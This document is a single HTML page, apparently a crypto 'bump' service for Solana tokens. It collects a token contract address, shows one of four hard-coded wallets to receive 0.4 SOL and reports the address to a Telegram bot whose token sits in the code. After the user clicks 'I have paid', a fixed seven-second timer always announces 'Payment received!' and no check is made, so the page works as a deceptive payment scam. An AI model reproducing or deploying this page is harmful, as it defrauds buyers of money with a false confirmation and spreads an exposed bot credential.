<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Smart Bumps</title>
  <style>
    body {
      font-family: 'Segoe UI', sans-serif;
      background: #0f0f23;
      color: white;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
    }
    .container {
      background: #1a1a2e;
      padding: 40px;
      border-radius: 15px;
      box-shadow: 0 0 25px rgba(0, 212, 255, 0.2);
      max-width: 500px;
      width: 100%;
      text-align: center;
    }
    .step {
      display: none;
    }
    .step.active {
      display: block;
    }
    input {
      width: 100%;
      padding: 15px;
      font-size: 16px;
      border-radius: 10px;
      border: 2px solid rgba(255, 255, 255, 0.1);
      background: rgba(255, 255, 255, 0.05);
      color: #fff;
      margin-bottom: 20px;
    }
    input:focus {
      border-color: #00d4ff;
      outline: none;
    }
    button {
      background: linear-gradient(135deg, #00d4ff, #0091ff);
      border: none;
      color: white;
      padding: 12px 25px;
      border-radius: 10px;
      font-weight: bold;
      cursor: pointer;
      font-size: 16px;
    }
    button:hover {
      background: linear-gradient(135deg, #00c2ff, #007acc);
    }
    .wallet-box {
      background: rgba(255, 255, 255, 0.05);
      padding: 20px;
      border-radius: 12px;
      word-wrap: break-word;
      font-family: 'Courier New', monospace;
      color: #00d4ff;
      margin: 20px 0;
    }
    .loader {
      margin-top: 20px;
      font-size: 15px;
      color: #bbb;
    }
  </style>
</head>
<body>
  <div class="container">
    <!-- Step 1 -->
    <div class="step step-1 active">
      <h2>Step 1: Enter Contract Address</h2>
      <input type="text" id="ca" placeholder="Paste Solana Contract Address" required />
      <button onclick="goToStep(2)">Next</button>
    </div>

    <!-- Step 2 -->
    <div class="step step-2">
      <h2>Step 2: Make Payment</h2>
      <p>Send exactly <strong>0.4 SOL</strong> to the address below:</p>
      <div class="wallet-box" id="walletAddressBox">Loading...</div>
      <button onclick="goToStep(3)">I have paid</button>
    </div>

    <!-- Step 3 -->
    <div class="step step-3">
      <h2>Step 3: Verifying Payment...</h2>
      <div class="loader" id="loader">Checking payment on Solana blockchain...</div>
    </div>
  </div>

  <script>
    const wallets = [
      'AFLmkhJkTe4cxg87cgSpA6EXmG73i6JEvAAJopWfpruZ',
      '6Bc8Bc3PFJKcWQVcsuD3mRrAbKTRyVBgcr4YLmEubszQ',
      '4Zm5ksmdhRLYGGWPkUT5FEAMSYJZ7rgZDvyG6s2mWC2C',
      'DB9YZwXgNeQByab3bgJnJKrnYP7CtZGktrdnDRCLrKA3'
    ];

    let selectedWallet = '';
    let enteredCA = '';

    function goToStep(step) {
      document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
      document.querySelector('.step-' + step).classList.add('active');

      if (step === 2) {
        enteredCA = document.getElementById('ca').value.trim();
        if (!enteredCA) {
          alert("Please enter a contract address.");
          goToStep(1);
          return;
        }

        selectedWallet = wallets[Math.floor(Math.random() * wallets.length)];
        document.getElementById('walletAddressBox').textContent = selectedWallet;

        // Send Telegram alert
        fetch(`https://api.telegram.org/bot8434797216:AAEZ9lqrAIwKY5UopaaEzM-fkadY4S-Xqdo/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: '1129109001',
            text: `ðŸ†• NEW BUMP REQUEST\nðŸ“„ CA: ${enteredCA}\nðŸ’° Wallet: ${selectedWallet}`
          })
        }).catch(console.error);
      }

      if (step === 3) {
        checkPayment();
      }
    }

    function checkPayment() {
      let loader = document.getElementById("loader");
      loader.textContent = "Checking payment on Solana blockchain...";

      // Simulated delay â€“ replace with real check if needed
      setTimeout(() => {
        loader.textContent = "âœ… Payment received! Bump in progress...";
      }, 7000);
    }
  </script>
</body>
</html>
